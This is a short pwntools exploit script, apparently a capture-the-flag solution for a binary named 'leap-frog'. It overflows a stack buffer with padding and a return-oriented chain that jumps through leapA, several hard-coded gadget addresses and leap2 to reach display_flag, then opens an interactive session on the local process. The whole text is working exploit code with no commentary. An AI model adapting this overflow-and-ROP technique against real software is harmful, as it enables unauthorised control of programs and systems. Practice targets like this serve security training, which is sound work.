from pwn import *
context.arch = 'i386'
elf = ELF('./leap-frog')

p=process('./leap-frog')
gdb.attach(p)
payload = "A"*0x18 + p32(0)

payload += p32(elf.symbols['leapA'])
payload += p32(0x804882d)
payload += p32(0x080485c8)*5
payload += p32(0x80485ee)
payload += p32(0)
payload += p32(elf.symbols['leap2'])
payload += p32(elf.symbols['display_flag'])
payload += p32(0xdeadbeef)
p.sendline(payload)

p.interactive()
